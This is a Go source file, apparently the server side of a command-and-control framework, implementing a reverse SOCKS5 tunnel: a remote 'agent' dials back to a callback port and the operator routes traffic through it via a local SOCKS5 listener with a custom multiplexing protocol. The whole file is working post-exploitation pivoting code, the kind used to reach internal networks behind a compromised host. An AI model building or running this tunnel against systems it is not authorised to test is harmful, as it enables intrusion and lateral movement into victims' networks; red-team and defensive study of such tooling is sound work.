package server

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// ── mux frame type constants ──────────────────────────────────────────────────

const (
	muxSYN  byte = 1 // C2 → agent: payload = "host:port"
	muxData byte = 2 // bidirectional: payload = raw bytes
	muxFIN  byte = 3 // bidirectional: payload = empty
	muxOK   byte = 4 // agent → C2: payload = empty (connect succeeded)
	muxErr  byte = 5 // agent → C2: payload = error string (connect failed)
)

// ── per-stream state ──────────────────────────────────────────────────────────

// rsStream represents one SOCKS5 session multiplexed over the agent TCP connection.
type rsStream struct {
	id     uint32
	connCh chan bool   // receives true=OK / false=ERR after SYN
	dataCh chan []byte // buffered DATA frames arriving from the agent (cap 128)
	done   chan struct{}
	once   sync.Once
}

// close signals the stream is done (idempotent).
func (st *rsStream) close() {
	st.once.Do(func() { close(st.done) })
}

// ── per-job state ─────────────────────────────────────────────────────────────

// rsocksJob manages one agent's reverse tunnel and its associated SOCKS5 listener.
type rsocksJob struct {
	agentID    string
	callbackLn net.Listener  // agent dials here (random port, 0.0.0.0)
	socksLn    net.Listener  // operator's SOCKS5 entry point (127.0.0.1)
	agentConn  net.Conn      // set once the agent connects
	writeMu    sync.Mutex    // serialises writes to agentConn
	streams    sync.Map      // streamID (uint32) → *rsStream
	nextID     atomic.Uint32 // monotonically increasing stream IDs
	done       chan struct{}
	once       sync.Once
	user       string        // RFC 1929 credentials (empty = no auth)
	pass       string
}

// stop tears down the job (idempotent).
func (j *rsocksJob) stop() {
	j.once.Do(func() {
		close(j.done)
		j.callbackLn.Close()
		j.socksLn.Close()
		if j.agentConn != nil {
			j.agentConn.Close()
		}
	})
}

// writeFrame serialises and sends a mux frame to the agent connection.
// Header layout: [4B streamID LE][1B type][4B payloadLen LE]
func (j *rsocksJob) writeFrame(streamID uint32, t byte, payload []byte) error {
	j.writeMu.Lock()
	defer j.writeMu.Unlock()
	if j.agentConn == nil {
		return fmt.Errorf("no agent connection")
	}
	hdr := make([]byte, 9)
	binary.LittleEndian.PutUint32(hdr[0:4], streamID)
	hdr[4] = t
	binary.LittleEndian.PutUint32(hdr[5:9], uint32(len(payload)))
	if _, err := j.agentConn.Write(hdr); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err := j.agentConn.Write(payload)
		return err
	}
	return nil
}

// ── package-level job registry ────────────────────────────────────────────────

var (
	rsocksMu   sync.Mutex
	rsocksJobs = map[string]*rsocksJob{} // agentID → job
)

// ── exported API ──────────────────────────────────────────────────────────────

// StartRSocks opens a callback listener (random port, 0.0.0.0) for the agent
// and a local SOCKS5 listener (socksPort, 127.0.0.1) for the operator.
// It returns callbackPort so the caller can embed it in the task args sent to
// the agent. user/pass enforce RFC 1929 auth on the operator SOCKS5 port;
// pass empty strings to disable.
func (s *Server) StartRSocks(agentID string, socksPort int, user, pass string) (callbackPort int, err error) {
	rsocksMu.Lock()
	defer rsocksMu.Unlock()

	if _, exists := rsocksJobs[agentID]; exists {
		return 0, fmt.Errorf("rsocks already running for agent %s", agentID)
	}

	// Let the OS pick a free port for the agent callback.
	callbackLn, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return 0, fmt.Errorf("callback listener: %w", err)
	}

	// Operator-facing SOCKS5 port — loopback only.
	socksLn, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", socksPort))
	if err != nil {
		callbackLn.Close()
		return 0, fmt.Errorf("socks listener: %w", err)
	}

	cbPort := callbackLn.Addr().(*net.TCPAddr).Port

	j := &rsocksJob{
		agentID:    agentID,
		callbackLn: callbackLn,
		socksLn:    socksLn,
		done:       make(chan struct{}),
		user:       user,
		pass:       pass,
	}
	rsocksJobs[agentID] = j

	// Wait for the agent to dial in.
	go j.waitForAgent(s)

	s.printf("[rsocks] agent=%s  callback=:%d  socks=127.0.0.1:%d\n",
		agentID[:8], cbPort, socksPort)

	return cbPort, nil
}

// StopRSocks stops a running rsocks job for agentID.
func (s *Server) StopRSocks(agentID string) error {
	rsocksMu.Lock()
	j, ok := rsocksJobs[agentID]
	if ok {
		delete(rsocksJobs, agentID)
	}
	rsocksMu.Unlock()

	if !ok {
		return fmt.Errorf("no rsocks job for agent %s", agentID)
	}
	j.stop()
	s.printf("[rsocks] stopped for agent %s\n", agentID[:8])
	return nil
}

// ── internal goroutines ───────────────────────────────────────────────────────

// waitForAgent accepts exactly one connection on callbackLn (the agent's
// dial-back), then starts the mux reader and the SOCKS5 acceptor.
func (j *rsocksJob) waitForAgent(s *Server) {
	// callbackLn accepts exactly one connection.
	conn, err := j.callbackLn.Accept()
	if err != nil {
		select {
		case <-j.done:
		default:
			s.printf("[rsocks] agent accept error: %v\n", err)
			j.stop()
		}
		return
	}
	// No more agent connections needed on this port.
	j.callbackLn.Close()

	j.writeMu.Lock()
	j.agentConn = conn
	j.writeMu.Unlock()

	s.printf("[rsocks] agent %s connected from %s\n", j.agentID[:8], conn.RemoteAddr())

	// Start demultiplexer.
	go j.readAgentFrames(s)

	// Start SOCKS5 acceptor now that we have a live agent tunnel.
	go j.acceptSocks(s)
}

// acceptSocks loops accepting operator SOCKS5 connections and dispatches each
// to handleSocksConn.
func (j *rsocksJob) acceptSocks(s *Server) {
	for {
		conn, err := j.socksLn.Accept()
		if err != nil {
			select {
			case <-j.done:
			default:
				s.printf("[rsocks] socks accept error: %v\n", err)
			}
			return
		}
		go j.handleSocksConn(s, conn)
	}
}

// readAgentFrames demultiplexes frames arriving from the agent and dispatches
// them to the appropriate rsStream.
func (j *rsocksJob) readAgentFrames(s *Server) {
	defer j.stop()

	hdr := make([]byte, 9)
	for {
		if _, err := io.ReadFull(j.agentConn, hdr); err != nil {
			select {
			case <-j.done:
			default:
				s.printf("[rsocks] agent read error: %v\n", err)
			}
			return
		}

		streamID := binary.LittleEndian.Uint32(hdr[0:4])
		frameType := hdr[4]
		payloadLen := binary.LittleEndian.Uint32(hdr[5:9])

		var payload []byte
		if payloadLen > 0 {
			payload = make([]byte, payloadLen)
			if _, err := io.ReadFull(j.agentConn, payload); err != nil {
				select {
				case <-j.done:
				default:
					s.printf("[rsocks] agent payload read error: %v\n", err)
				}
				return
			}
		}

		val, ok := j.streams.Load(streamID)
		if !ok {
			// Unknown stream — ignore.
			continue
		}
		st := val.(*rsStream)

		switch frameType {
		case muxOK:
			select {
			case st.connCh <- true:
			default:
			}

		case muxErr:
			select {
			case st.connCh <- false:
			default:
			}

		case muxData:
			select {
			case st.dataCh <- payload:
			default:
				// Receiver is too slow — terminate the stream.
				j.streams.Delete(streamID)
				_ = j.writeFrame(streamID, muxFIN, nil)
				st.close()
			}

		case muxFIN:
			j.streams.Delete(streamID)
			st.close()
		}
	}
}

// ── SOCKS5 handler ────────────────────────────────────────────────────────────

// handleSocksConn performs the SOCKS5 handshake over conn, opens a mux stream
// to the agent, and then relays data bidirectionally.
func (j *rsocksJob) handleSocksConn(s *Server, conn net.Conn) {
	defer conn.Close()

	// ── 1. SOCKS5 greeting ────────────────────────────────────────────────────
	//  Client: VER(1) NMETHODS(1) METHODS(N)
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return
	}
	if hdr[0] != 0x05 {
		return // not SOCKS5
	}
	nMethods := int(hdr[1])
	methods := make([]byte, nMethods)
	if _, err := io.ReadFull(conn, methods); err != nil {
		return
	}

	if j.user != "" {
		// Require RFC 1929 user/pass auth (method 0x02).
		offered := false
		for _, m := range methods {
			if m == 0x02 {
				offered = true
				break
			}
		}
		if !offered {
			conn.Write([]byte{0x05, 0xFF}) // no acceptable method
			return
		}
		if _, err := conn.Write([]byte{0x05, 0x02}); err != nil {
			return
		}
		// RFC 1929 sub-negotiation: VER(1) ULEN(1) USER(N) PLEN(1) PASS(M)
		sub := make([]byte, 2)
		if _, err := io.ReadFull(conn, sub); err != nil {
			return
		}
		if sub[0] != 0x01 {
			return
		}
		uBuf := make([]byte, sub[1])
		if _, err := io.ReadFull(conn, uBuf); err != nil {
			return
		}
		pLen := make([]byte, 1)
		if _, err := io.ReadFull(conn, pLen); err != nil {
			return
		}
		pBuf := make([]byte, pLen[0])
		if _, err := io.ReadFull(conn, pBuf); err != nil {
			return
		}
		if string(uBuf) != j.user || string(pBuf) != j.pass {
			conn.Write([]byte{0x01, 0xFF}) // auth failure
			return
		}
		if _, err := conn.Write([]byte{0x01, 0x00}); err != nil { // auth success
			return
		}
	} else {
		// No auth.
		if _, err := conn.Write([]byte{0x05, 0x00}); err != nil {
			return
		}
	}

	// ── 2. SOCKS5 request ─────────────────────────────────────────────────────
	//  Client: VER(1) CMD(1) RSV(1) ATYP(1) ...
	reqHdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, reqHdr); err != nil {
		return
	}
	if reqHdr[0] != 0x05 || reqHdr[1] != 0x01 {
		// Only CONNECT (0x01) is supported.
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	var target string
	atyp := reqHdr[3]
	switch atyp {
	case 0x01: // IPv4
		addr := make([]byte, 4)
		if _, err := io.ReadFull(conn, addr); err != nil {
			return
		}
		portBytes := make([]byte, 2)
		if _, err := io.ReadFull(conn, portBytes); err != nil {
			return
		}
		port := int(portBytes[0])<<8 | int(portBytes[1])
		target = fmt.Sprintf("%d.%d.%d.%d:%d", addr[0], addr[1], addr[2], addr[3], port)

	case 0x03: // domain name
		lenByte := make([]byte, 1)
		if _, err := io.ReadFull(conn, lenByte); err != nil {
			return
		}
		domain := make([]byte, lenByte[0])
		if _, err := io.ReadFull(conn, domain); err != nil {
			return
		}
		portBytes := make([]byte, 2)
		if _, err := io.ReadFull(conn, portBytes); err != nil {
			return
		}
		port := int(portBytes[0])<<8 | int(portBytes[1])
		target = fmt.Sprintf("%s:%d", domain, port)

	case 0x04: // IPv6
		addr := make([]byte, 16)
		if _, err := io.ReadFull(conn, addr); err != nil {
			return
		}
		portBytes := make([]byte, 2)
		if _, err := io.ReadFull(conn, portBytes); err != nil {
			return
		}
		port := int(portBytes[0])<<8 | int(portBytes[1])
		target = fmt.Sprintf("[%s]:%d", net.IP(addr).String(), port)

	default:
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// ── 3. Allocate stream + send SYN to agent ────────────────────────────────

	streamID := j.nextID.Add(1)
	st := &rsStream{
		id:     streamID,
		connCh: make(chan bool, 1),
		dataCh: make(chan []byte, 128),
		done:   make(chan struct{}),
	}
	j.streams.Store(streamID, st)

	if err := j.writeFrame(streamID, muxSYN, []byte(target)); err != nil {
		j.streams.Delete(streamID)
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// ── 4. Wait for OK/ERR from agent (10 s timeout) ─────────────────────────

	timer := time.NewTimer(10 * time.Second)
	defer timer.Stop()

	select {
	case ok := <-st.connCh:
		if !ok {
			j.streams.Delete(streamID)
			conn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			return
		}
	case <-timer.C:
		j.streams.Delete(streamID)
		conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	case <-j.done:
		j.streams.Delete(streamID)
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}

	// ── 5. SOCKS5 success reply ───────────────────────────────────────────────

	if _, err := conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
		j.streams.Delete(streamID)
		st.close()
		_ = j.writeFrame(streamID, muxFIN, nil)
		return
	}

	// ── 6. Relay: operator conn → agent (DATA frames) ─────────────────────────

	go func() {
		defer func() {
			j.streams.Delete(streamID)
			st.close()
			_ = j.writeFrame(streamID, muxFIN, nil)
		}()
		buf := make([]byte, 32*1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				chunk := make([]byte, n)
				copy(chunk, buf[:n])
				if werr := j.writeFrame(streamID, muxData, chunk); werr != nil {
					return
				}
			}
			if err != nil {
				return
			}
			select {
			case <-st.done:
				return
			case <-j.done:
				return
			default:
			}
		}
	}()

	// ── 7. Relay: agent (DATA frames) → operator conn ─────────────────────────

	for {
		select {
		case chunk, ok := <-st.dataCh:
			if !ok {
				return
			}
			if _, err := conn.Write(chunk); err != nil {
				return
			}
		case <-st.done:
			return
		case <-j.done:
			return
		}
	}
}
